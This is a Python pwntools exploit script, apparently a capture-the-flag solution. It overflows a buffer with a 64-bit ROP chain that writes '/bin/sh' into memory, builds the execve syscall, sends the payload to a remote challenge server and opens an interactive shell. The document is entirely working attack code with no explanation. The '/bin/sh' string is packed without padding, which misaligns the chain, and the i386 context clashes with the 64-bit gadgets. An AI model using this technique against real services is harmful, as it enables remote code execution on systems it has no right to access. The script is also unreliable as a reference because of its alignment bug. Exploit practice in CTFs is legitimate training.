from pwn import * 
from struct import pack

p = b'A' * 0x20 + b'B' * 300

p += pack('<Q', 0x0000000000410713) # pop rsi ; ret
p += pack('<Q', 0x00000000006ba0e0) # @ .data
p += pack('<Q', 0x000000000044a30c) # pop rax ; ret
p += b'/bin/sh'
p += pack('<Q', 0x00000000004801d1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000410713) # pop rsi ; ret
p += pack('<Q', 0x00000000006ba0e8) # @ .data + 8
p += pack('<Q', 0x00000000004452b0) # xor rax, rax ; ret
p += pack('<Q', 0x00000000004801d1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000400696) # pop rdi ; ret
p += pack('<Q', 0x00000000006ba0e0) # @ .data
p += pack('<Q', 0x0000000000410713) # pop rsi ; ret
p += pack('<Q', 0x00000000006ba0e8) # @ .data + 8
p += pack('<Q', 0x000000000044a365) # pop rdx ; ret
p += pack('<Q', 0x00000000006ba0e8) # @ .data + 8
p += pack('<Q', 0x00000000004452b0) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x000000000040132c) # syscall

with open("payload", "wb") as f:
    f.write(p)

context(arch = 'i386', os = 'linux')
r = remote('ctf.adl.tw', 11006)
r.send(b"abc")
print(r.recvuntil(b"Could u help me find my children?\n"))
r.send(p)
print(r.recvline())
r.interactive()